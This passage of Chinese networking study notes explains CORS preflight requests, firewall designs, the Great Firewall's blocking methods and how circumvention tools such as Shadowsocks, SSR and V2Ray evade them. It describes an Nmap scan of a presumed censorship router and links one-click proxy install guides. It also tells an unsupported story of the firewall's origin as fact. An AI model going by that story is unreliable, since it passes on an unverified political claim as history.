false;\n```\n\n需要注意的是，**如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名**。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。\n\n> 注：axios发送post请求时，withCredentials默认是false, 即不携带cookie, 我们可以使用下面方法来使其携带cookie\n```js\n axios({\n        method: \"post\",\n        url: apiConfig.getCoupon,\n        withCredentials: true,\n        data: {\n          type: x\n        }\n```\n\n### 非简单请求\n#### 预检请求(preflight request)\n非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。\n\n非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为\"预检\"请求（preflight）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125829.png)\n\n浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。\n\n下面是一段浏览器的JavaScript脚本。\n```\nvar url = 'http://api.alice.com/cors';\nvar xhr = new XMLHttpRequest();\nxhr.open('PUT', url, true);\nxhr.setRequestHeader('X-Custom-Header', 'value');\nxhr.send();\n```\n上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。\n\n浏览器发现，这是一个非简单请求，就自动发出一个\"预检\"请求，要求服务器确认可以这样请求。下面是这个\"预检\"请求的HTTP头信息。\n```\nOPTIONS /cors HTTP/1.1\nOrigin: http://api.bob.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: X-Custom-Header\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n\n\"预检\"请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。\n\n除了Origin字段，\"预检\"请求的头信息包括两个特殊字段。\n**1. Access-Control-Request-Method**\n该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。\n**2. Access-Control-Request-Headers**\n该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header\n\n\n#### 预检请求的回应\n服务器收到\"预检\"请求以后，检查了Origin、Access-\tControl-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。\n```\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: X-Custom-Header\nContent-Type: text/html; charset=utf-8\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain\n```\n上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。\n```\nAccess-Control-Allow-Origin: *\n```\n如果服务器否定了\"预检\"请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125841.png)\n\n服务器回应的其他CORS相关字段如下。\n```\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: X-Custom-Header\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 1728000\n```\n**Access-Control-Allow-Methods**\n该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次\"预检\"请求。\n\n**Access-Control-Allow-Headers**\n如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在\"预检\"中请求的字段。\n如果一个跨域请求的请求头中包含的字段不在`Access-Control-Allow-Headers`中，则会报如下错误：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125853.png)\n\n\n**Access-Control-Allow-Credentials**\n该字段与简单请求时的含义相同。\n\n**Access-Control-Max-Age**\n该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。\n\n#### 浏览器的正常请求和回应\n一旦服务器通过了\"预检\"请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。\n\n下面是\"预检\"请求之后，浏览器的正常CORS请求。\n```\nPUT /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nX-Custom-Header: value\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n上面头信息的Origin字段是浏览器自动添加的。\n\n下面是服务器正常的回应。\n```\nAccess-Control-Allow-Origin: http://api.bob.com\nContent-Type: text/html; charset=utf-8\n```\n上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的\n\n## 与JSONP的比较\nCORS与JSONP的使用目的相同，但是比JSONP更强大。\nJSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。\n\n# 防火墙技术\n防火墙：一种高级访问控制设备，置于不同网络安全域之间，它通过相关的安全策略来控制（允许、拒绝、监视、记录）进出网络的访问行为。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125903.png)\n\n## 防火墙的核心技术\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125912.png)\n\n### 包过滤防火墙技术原理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125921.png)\n\n### 应用代理防火墙技术原理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125933.png)\n\n### 状态检测防火墙技术原理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125945.png)\n\n### 完全内容检测防火墙技术原理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125957.png)\n\n## 防火墙体系结构\n防火墙体系结构分为过滤路由器，多宿主主机，被屏蔽主机，被屏蔽子网\n\n### 过滤路由器（Filtering Router）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130007.png)\n\n### 双宿主主机（Dual Homed Gateway）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130018.png)\n\n### 被屏蔽主机（Screened Host Gateway ）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130028.png)\n\n### 被屏蔽子网（Screened Subnet）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130037.png)\n\n## 防火墙技术原理\n### 防火墙基本功能\n1. 访问控制（防火墙是一种高级的访问控制设备）\n2. 地址转换（都会部署在内外网之间，尤其是互联网出口，因此会涉及到地址转换问题）\n3. 网络环境支持（2层或3层之间的内部连接）\n4. 带宽管理功能（如观看视频时，同时其它人要去炒股，）\n5. 入侵检测和攻击防御\n6. 用户认证\n7. 高可用性\n\n#### 访问控制\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130047.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130116.png)\n\n#### 地址转换\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130125.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130135.png)\n\n#### 网络环境支持\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130145.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130154.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130203.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130216.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130227.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130237.png)\n\n#### 宽带管理\n可以根据业务进行不同的流量分配，以保证重要业务的应用\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130248.png)\n\n#### 入侵检测和攻击防御\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130258.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130307.png)\n\n#### 用户认证\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130316.png)\n\n#### 高可用性\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130333.png)\n\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130343.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130352.png)\n\n### 防火墙典型应用\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130402.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130412.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130424.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130437.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130446.png)\n\n# 翻墙中的墙是什么\n首先墙是防火长城(Great Fire Wall ,GFW)。08年以前，我国的网络审查制度还不是很健全，现在无法访问的这些网站和服务，当时都是可以正常访问的。后来因为一些政治原因，我国建立起审查制度，部署了GFW，来阻挡大陆互联网用户访问某些境外网站和服务。这里注意：网络审查制度不等同于GFW。审查制度针对的是所有的互联网流量，国内的网站也会受到政治的直接干预，被要求自我审查、自我监管甚至关闭,。大陆的所有网站都要强制配合。GFW的作用主要在于分析和过滤境外资讯和互相访问。所以很多人认为，墙的目的就是为了洗脑、愚化民众，不让外界的声音传进来。曾经一度，基本上所有人都这么想的。可能确实有这部分原因，但是真正的导火索，其实很多人都不知道。08年前奥运会前夕，恐怖组织在FaceBook上策划、协调并且实施了对我西部地区的一个恐怖袭击。中国政府当时就要求FaceBook配合审查，以防再次出现此类事件。但是FaceBook以尊重保护用户隐私，这样的一个理由来拒绝了。同时Google也以同样的理由拒绝了中国政府的要求。所以很简单，大陆政府就不让你们这些不愿意配合的外国公司在中国开展业务。于是，FaceBook海还有Google的一系类服务都被封了。同期被陆陆续续封锁的还有Twitter Tumblr这些比较大的互联网服务商。经过一段时间的审查制度和GFW的越来越规范，导致甚至一些不涉及到政治和国民安全的互联网服务，比如说成人网站也被封了。墙由政治时间而起，却最后连带一起这些色情网站也躺枪了\n\n## GFW的原理\n人们对于GFW工作原理的猜猜从来没有停息过，因此尽管其真实的实现细节仍然无从知晓，但一些有着强烈好奇心的学者以及国内的翻墙爱好者还是瞥见了一些端倪。普遍的看法是，GFW的工作机制主要包括IP黑名单、内容审查和DNS劫持等三种，下面我们逐一举例探讨\n\n### IP黑名单\n#### 一个例子\n视频分享网站Youtube在国内遭到封禁己是众所周知的事实，由于使用域名访问会存在DNS劫持问题，这里直接以其IP地址之一 208.65.153.238 来举例说明GFW的IP黑名单机制。\n用浏览器访间http://208.65.153.238有如下结果：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130457.png)\n\n执行ping命令也有超时现象:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130508.png)\n\n上面两幅图均表明，目标主机未能(或无法）及时响应我们的请求，为了一探究竞，我\n们进一步执行`tracert`命令如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130517.png)\n\n结果易示，路径断在了主机 202.112.61.214 的地方\n\n#### 另一个例子\n访问网站牛博国际存在同样的问题，对其IP地址执行`tracert`也有类似结果：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130528.png)\n\n#### 猜测\n根据以上结果我们猜测，GFW 很有可能维护了一张IP黑名单，一旦发现发往黑名单中\n地址的请求数据包，就直接将其丢弃，这将导致源主机得不到目标主机的及时响应而引发超时，从而达到屏蔽对目标主机的访问的目的。\n\n进一步，我们有理由认为主机 202.112.61.214 就是 GFW 的设备之一，为了证实这一猜测，我们用Nmap对其进行了扫描:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130538.png)\n\n扫描结果显示，设备 202.112.61.214 很有可能是一台 Cisco 的路由器，这与 GFW的设备构成是吻合的\n\n#### 黑名单的缺点\n显而易见，这种对被封禁的网站采用黑名单而不是对被介许访问的网站采用白名单的过滤机制，难免会有漏网之鱼的存在，Youtube的另外一个地址208.117.240.37 就是-个很好的例子：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130547.png)\n\n### 内容审查\n#### 一个简单的例子\n用 Google.com 搜索关键词 “freegate”，起初我们还能够得到搜索结果：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130558.png)\n\n但是与此同时，我们收到了大量“从 Google 发来的“TCP 连接重置包。下图是使用Wireshark抓包的结果。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130608.png)\n\n刷新页面会发现已经无法访问：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130621.png)\n\n并且Google.com也变得无法访问:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130631.png)\n\n#### 一个极瑞的例子\n与前面的例子类似，访问http:///chinagtw.or/search/label/anti-censorship会收到数以百计的TCP连接重置包：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130645.png)\n\n#### 猜测\n我们猜测，GFW 对 HTTP 数据包进行了扫描，并目 GFW 内部可能包含有一些敏感词汇列表, 一旦发现被扫描数据包中出现敏感词汇，就会立即向源主机和目标主机发送伪装成对方地址的 TCP 连接重置包，以实现断开连接的目的。\n进一步，GFW 还会在一个临时的黑名单中记录遭到封禁的源主机和目标主机的地址，并保存一段有限长的时间。一旦发现被封禁的源主机在封禁期间再次请求目标主机，将直接返回 TCP 连接重置包（此时可能是单向的)，而无需扫描新的请求数据包。\n另一个发现是，这种内容审查机制并非对所有站点起作用，例如，使用 Google.cn 搜索,同样的关健词 “freegate”就不会出现被盾的现象。一种可能的原因是，GFW 启用了一张IP监视名单，而Google.com 的地址正是其中之一：另一种可能是，访间 Google.cn 不会经过GFW 设备，也就不会触发 TCP 连接重置，而位于 GFW 之外的 Google.com 则难逃此劫。\n\n### DNS 劫持\n#### 一个例子\n除IP黑名单技术外，GFW还采用了DNS劫持的手段来达到对youtube的封禁目的。\n为了说明这一点，我们执行`nslookup`命令如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130659.png)\n\n上图的结果表明\"www.youtube.com”经过DNS服务器 166.111.8.28 被解析到地址 202.106.1.2，但是事实上，该地址并非Youtube真实地址中的任何一个\n进一步，即使使用国外的DNS服务器，如OpenDNS来进行解析，也不能得到youtube的真实地址\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130708.png)\n\n并且每次返回的结果可能大相径庭:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130718.png)\n\n然而，如果使用在线nslookup服务，例如http://www.kloth.net/services/nslookup.phe，则可以得到youtube的直实地址：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130729.png)\n\n#### 猜测\nGFW至少使用了两种DNS劫持机制：\n一方面，GFW对国内DNS服务器进行了缓存污染，这种污染体现在使用国内DNS服务器对youtube进行解析会得到稳定的、虛假的IP地址\n另一方面，GFW会拦截和应答试图从时内发往国外的DNS解析请求（也可能是对国外DNS服务器的应答进行了算改），这体现在使用OpenDNS进行解析时观察到的可变的、虚假的IP地址。\n\n## 翻墙的工作原理\nGFW部署之后，我们根据它的工作原理判断出只要GFW不能探明我发送的数据包的真实意图，那么GFW就不会中断我们的请求。为了实现这个，我们可以通过连接一台符合GFW认为合理的服务器作为中转，来替代我去做想做的事情，然后把结果告诉我。这套逻辑也正是很多初期htpp代理、VPN、SSH代理这些突破封锁的实现方式\n\n### SSH代理工作原理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130739.png)\n\n1. 本地网络上的计算机PC发送一个请求建立加密通道的数据包，接入骨干网，域名解析\n2. GFW发现我访问的并非Google或者是Facebook，而是一台GFW允许访问的国外的服务器，此时GFW放行\n3. 数据包经过中转服务器SSH server解密出我真实想要访问的地址,并且对其真实地址进行访问\n4. 真实地址服务器返回响应数据给中转服务器SSH server\n5. 中站服务器SSH Server将响应数据再经过墙传回到本地计算机PC\n\n你会发现这样一来就完美规避了GFW一切有效探测手段。首先我的数据流量不再是明文，而是加密数据，因此GFW看不到我的关键字。第二是DNS解析的时候，发现我访问的对象是GFW允许的服务器，而不是Google, 那么DSN也正常解析。\n\n然而这里有一个问题， 那就是GFW逐渐发现，越来越多的流量都是这种类型的模式，即先发送一个数据包请求和一个服务器建立这种加密连接，然后紧跟着一个代理请求。这个就是传说中的特征。\n由于太多用户使用这种方式来翻墙，所以GFW根据这些特别有特征明显的这种流量做了两件事。第一，屏蔽掉vpn用的端口，以后你再想用vpn，需要申请报备，审核通过了，你才可以使用。第二，慢慢积累这些提供vpn服务的主机的ip，然后屏蔽掉这些ip。经过这些打压，vpn这种翻墙的方式就慢慢死掉了\n\n> 注：vpn本身不是根据翻墙的这个需求被开发出来的，只是恰好vpn这种流量加密的方式，能使得GFW无法探测\n\n### Shadowsocks(SS)工作原理\nSS的出现，可以说是一个拐点。SS引出了一个把代理服务器拆分成本地和远程两个的这种概念。实现经过GFW的流量全部加密，从而消除明显的这个流量的特征的这个概念。后来衍生出来的SSR、v2ray这些都是基于类似的这个原理。\n\n一些为具体原理解析：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130749.png)\n\n1. 本地计算机PC发出一个数据包给本地的SS服务器SS Local(这里说的SS服务器，指的是你电脑或者手机上装的Shadowsocks翻墙软件，或者是你的翻墙路由器)发送数据加密请求。\n2. 由于本地网络在本地，所以不过墙，而且瞬间能完成加密，然后发送加密数据，经过DNS解析，通过骨干网到达国际出口。\n3. GFW因为探测不到具有特别明显特征的这个流量，所以也放行，到达你的远程中转服务器(SS Server)，也就是你的远程的Shadowsocks服务器，这个可以是你自己的vps，也可以是机场的服务器。\n4. 远程中转服务器解密你的数据，然后转发到google\n5. google回应数据给远程中转服务器\n6. 远程中转服务器加密数据，发送加密数据到达GFW\n7. 因为GFW探测不到特别明显的流量，并且数据包也不是http的明文数据，所以GFW无法嗅探到敏感词，那么只好放行，到达你的本地Shadowsocks服务器\n8. 本地Shadowsocks服务器经过解密，将数据包发送到本地计算机\n\n以上一套流程，就是Shadowsocks的基本工作原理和逻辑，后面出现的SSR和V2ray技术，虽然具体细节上有一些微小的差异，但是都是基于这种基础的这种逻辑。目前各种各样的这种加密方式与算法基本都是在GFW这个位置，用于伪装和消除特征。\n\n至于为什么GFW不封锁所有的国际加密流量，是因为相比翻墙的流量，超过99%的这些通信流量都是正常的需求。如果把这些所有的国际加密流量都封锁掉，那中国真就成了局域网。所以说，目前来说，这就是为什么Shadowsocks这种实现原理是相对安全可靠的。 和刚才的vpn、SSH代理的翻墙模式最大区别在于VPN、SSH代理的特征很明显，过墙的数据很遵循一个固定的一个套路，都是先发送一个建立加密通道的数据包。Shadowsocks则是在本地完成加密，过墙的数据已经是加密数据了，所以GFW无法探测到固定的模式和特征。\n\n# 代理、vpn、SS、SSR、V2Ray、加速器与vps\n## 正向代理与反向代理\n### 正向代理\n正向代理（forward proxy）：是一个位于客户端和目标服务器之间的服务器(代理服务器)，为了从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。\n\n这种代理其实在生活中是比较常见的，比如访问外国网站技术（翻墙），其用到的就是代理技术。\n\n有时候，用户想要访问某国外网站，该网站无法在国内直接访问，但是我们可以访问到一个代理服务器，这个代理服务器可以访问到这个国外网站。这样呢，用户对该国外网站的访问就需要通过代理服务器来转发请求，并且该代理服务器也会将请求的响应再返回给用户。这个上网的过程就是用到了正向代理。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130759.png)\n\n**所以，正向代理，其实是\"代理服务器\"代理了\"客户端\"，去和\"目标服务器\"进行交互。**\n通过正向代理服务器访问目标服务器，目标服务器是不知道真正的客户端是谁的，甚至不知道访问自己的是一个代理\n\n#### 正向代理的用途\n**1. 突破访问限制**\n通过代理服务器，可以突破自身IP访问限制，访问国外网站，教育网等。\n**2. 提高访问速度**\n通常代理服务器都设置一个较大的硬盘缓冲区，会将部分请求的响应保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。\n**3. 隐藏客户端真实IP**\n上网者也可以通过这种方法隐藏自己的IP，免受攻击。\n\n### 反向代理\n反向代理（reverse proxy）：是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。\n\n对于常用的场景，就是我们在Web开发中用到的负载均衡服务器，客户端发送请求到负载均衡服务器上，负载均衡服务器再把请求转发给一台真正的服务器来执行，再把执行结果返回给客户端。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130808.png)\n\n**所以，反向代理，其实是\"代理服务器\"代理了\"目标服务器\"，去和\"客户端\"进行交互。**\n通过反向代理服务器访问目标服务器时，客户端是不知道真正的目标服务器是谁的，甚至不知道自己访问的是一个代理。\n\n#### 反向代理的用途\n**1. 隐藏服务器真实IP**\n使用反向代理，可以对客户端隐藏服务器的IP地址。\n**2. 负载均衡**\n反向代理服务器可以做负载均衡，根据所有真实服务器的负载情况，将客户端请求分发到不同的真实服务器上。\n**3. 提高访问速度**\n反向代理服务器可以对于静态内容及短时间内有大量访问请求的动态内容提供缓存服务，提高访问速度。\n**4. 提供安全保障**\n反向代理服务器可以作为应用层防火墙，为网站提供对基于Web的攻击行为（例如DoS/DDoS）的防护，更容易排查恶意软件等。还可以为后端服务器统一提供加密和SSL加速（如SSL终端代理），提供HTTP访问认证等。\n\n### 正向代理和反向代理的区别\n虽然正向代理服务器和反向代理服务器所处的位置都是客户端和真实服务器之间，所做的事情也都是把客户端的请求转发给服务器，再把服务器的响应转发给客户端，但是二者之间还是有一定的差异的。\n1. **正向代理其实是客户端的代理**，帮助客户端访问其无法访问的服务器资源。**反向代理则是服务器的代理**，帮助服务器做负载均衡，安全防护等。\n2. **正向代理一般是客户端架设的**，比如在自己的机器上安装一个代理软件。**而反向代理一般是服务器架设的**，比如在自己的机器集群中部署一个反向代理服务器。\n3. **正向代理中，服务器不知道真正的客户端到底是谁**，以为访问自己的就是真实的客户端。而在**反向代理中，客户端不知道真正的服务器是谁**，以为自己访问的就是真实的服务器。\n4. 正向代理和反向代理的作用和目的不同。**正向代理主要是用来解决访问限制问题。而反向代理则是提供负载均衡、安全防护等作用。二者均能提高访问速度。**\n\n\n## PN与VPN\n### 专用网络PN(Private Networks)\n#### 定义\n专用网络是两个企业间的专线连接，这种连接是两个企业的内部网之间的物理连接。专线是两点之间永久的专用电话线连接。**和一般的拨号连接不同，专线是一直连通的。这种连接的最大优点就是安全。除了这两个合法连入专用网络的企业，其他任何人和企业都不能进入该网络**。所以，专用网络保证了信息流的安全性和完整性。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130823.png)\n\n#### 缺陷\n专用网络的最大缺陷是成本太高，因为专线非常昂贵。每对想要专用网络的企业都需要一条独立的专用(电话)线把它们连到一起，而不是建立在公用网络上。\n例如，如果一个企业想通过专用网络与7个企业建立外部网连接，企业必须支付7条专线的费用。企业一般把这个问题称为“伸缩”问题：增加专用网络的数目很困难、昂贵且耗时。那么企业到底该如何在它们的内部网之间建立紧密和专用的联系呢?答案可能就是根据虚拟专用网络设计的外部网。\n\n### 虚拟专用网络VPN(Virtual Private Networks)\n#### 简介\nVPN属于远程访问技术, **简单地说就是在公用网络上建立专用网络，进行加密通讯**。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。VPN可通过服务器、硬件、软件等多种方式实现\n\n由于VPN是建立在公用网络上，所以要想实现与专用网络类似的安全性能，我们可以通过隧道技术、加密技术、密钥管理、认证和访问控制等方式来增强数据的安全性\n\n例如某公司员工出差到外地，他想访问企业内网的服务器资源，这种访问就属于远程访问。\n在传统的企业网络配置中，要进行远程访问，传统的方法是租用DDN（数字数据网）专线或帧中继，这样的通讯方案必然导致高昂的网络通讯和维护费用。对于移动用户（移动办公人员）与远端个人用户而言，一般会通过拨号线路（Internet）进入企业的局域网，但这样必然带来安全上的隐患。\n**让外地员工访问到内网资源，利用VPN的解决方法就是在内网中架设一台VPN服务器。外地员工在当地连上互联网后，通过互联网连接VPN服务器，然后通过VPN服务器进入企业内网**。为了保证数据安全，VPN服务器和客户机之间的通讯数据都进行了加密处理。有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，就如同专门架设了一个专用网络一样，但实际上VPN使用的是互联网上的公用链路，因此VPN称为虚拟专用网络，其实质上就是利用加密技术在公网上封装出一个数据通讯隧道。有了VPN技术，用户无论是在外地出差还是在家中办公，只要能上互联网就能利用VPN访问内网资源，这就是VPN在企业中应用得如此广泛的原因。\n\n## SS、SSR\nShadowsocks(简称SS)是一种基于Socks5代理方式的加密传输协议, Shadowsocks应该是最为人熟知的代理工具之一了，由于其软件logo是飞机的形状，所以也称作小飞机，而在服务器上搭建Shadowsocks供他人使用，也就称为`机场`。Shadowsocks原作者Clowwindy最开始只是为了方便自己科学上网，而开发了协议。并且将源代码放在Github上供大家开源使用，由于其开创性的中转服务器代理原理，使得翻墙效果非常好，很多个人以及开发商都在使用Shadowsocks搭建翻墙软件。\n也是因为这个原因，Clowwindy最后被请喝茶，随后Clowwindy在Github移除了相关代码，之后Shadowsocks无人维护，并且已经能被防火长城精准识别，目前已经很少人用Shadowsocks进行翻墙。\n之后，ShadowsocksR原作者breakwa11发起了新的分支，也称作SSR，也就是说在原Shadowsocks的基础上继续进行开发。关于ShadowsocksR以及其作者，中途发生了很多事，最后也删除了代码并解散了交流群组，同样的，任然有人在SSR基础继续进行开发，目前叫做SSRR。相关搭建教程可以[参考SSR一键安装](https://qiangwaikan.com/ssr/)\n\n## V2Ray\n简单的理解来说，V2Ray就是类似ShadowsocksR的代理翻墙协议，这是他们共通之处，也是大多数人使用V2Ray的原因。当然，V2Ray的作用可能并不是简单的一个翻墙协议，V2Ray严格上来说应该是一个工具箱，它甚至可以集成ShadowsocksR一起使用，而V2Ray用于翻墙的协议是其默认的VMess。\nV2Ray与SSR区别还是很多，总的来说V2Ray要比SSR要强大的多。但由于SSR要比V2Ray更早发布，所以也使得更多的人使用SSR，并且相关教程以及及客户端软件也更加丰富，也就是说SSR的生态更加完善。\nV2Ray的相对要更新一些，相关教程比较少，并且配置上要比SSR更加复杂，对新手来说不太容易上手，[参考V2Ray一键安装](https://qiangwaikan.com/v2ray/)。就翻墙效果来说，V2Ray可能要比SSR更好一些，V2Ray内置的VMess相对更加隐蔽性更好，并且提供了自定义协议的功能，对于有一定技术能力的人来说，自己开发一些扩展协议。\n至于V2Ray和SSR那个更好？个人觉得看自己的需求，如果你是想配置简单容易上手，那么SSR肯定更好用。如果你具备已经技术能力，那么V2Ray可能更适合你。翻墙稳定性来说，个人用下来差别不是很大。\n\n## 加速器\n加速器就其技术原理来说，就等同于VPN，只不过与翻墙VPN的用途不同而已。\n加速器的主要用户群体是国外网游玩家，他们在玩国外网友的时候，经常出现卡顿或者登不上等情况，这就是由于网络延迟较高。那么为什么会出现如此高的延迟呢？主要原因就是线路不同，运营商转发用户的数据有很多种线路，而通常来讲这些线路可能不是最优的，加速器服务商则租用了协议服务器，使得用户转发用户的数据线路更优，并且还会租用协议私有线路，降低高峰期网络拥堵问题。\n那么加速器可以用来翻墙吗？很遗憾，不能。就国内正规的网络加速器来说，都不能用于翻墙，这些加速器服务商都是有严格备案的，包括Google在内的很多黑名单网站都不能打开。\n\n## VPS\nVPS就是虚拟专用服务器(Virtual private server)的英文缩写，简单的理解就是一台服务器被分成了很多台，当然这里的”分”并不是说砍成几半的，而是利用一些技术手段，使得多个用户可共享这台服务器。\n通常，租用一台服务器费用是比较高的，而且对于用户来说，一台服务器的CPU计、内存、磁盘空间大多数时候是过剩的，这样非常浪费资源，并且用于又承担了较高的价格。而如果是购买VPS，价格则要划算得多，你相当于和其他多个用户一起在使用同一台服务器，你们共同分摊成本。当然你不用担心和其他用户在使用时产生冲突，这些问题通过虚拟化技术已经得到了很好的解决。\n不管是个人还是中小型企业，其实VPS都是不二之选，你不需要请专人维护服务器，也不会造成资源浪费，嫌太贵就降低配置，觉得资源不够就充钱升配，非常简单省事并且稳定。\n总的来说VPS就是一台小型的服务器，既然是服务器，那么利用前面介绍的Shadowsocks(SSR)或者V2Ray等开源软件，然后购买国外的VPS，在上面搭建翻墙软件。不过，如果是用来翻墙的VPS，那么线路是个很重要的指标，并不是所有VPS用来翻墙效果都好，首先要考虑延迟和带宽，而我用过很多VPS其实效果都不太理想，比如大家比较知名的搬瓦工、Vultr等。很多人在这上面搭建机场，导致这些VPS服务商很多IP段都被防火长城拉黑了。\n我不推荐用VPS搭建梯子的另外一个原因是，VPS只提供的一个IP，要明白没有万能的协议，以上所有的协议都不是绝对稳定，并且防火长城封IP有时候是玄学问题，一旦这个IP被封，那么只能花钱换IP，这只是其中一个问题，总的来说你要花费一些时间来维护你的梯子。\n\n## VPN 和代理的区别\n### 概念区别\n以下是维基百科对VPN 和代理的中文权威解释：\n“（英语：virtual private network，缩写：VPN）是常用于连接中、大型企业或团体间私人网络的通讯方法。它利用隧道协议（Tunneling 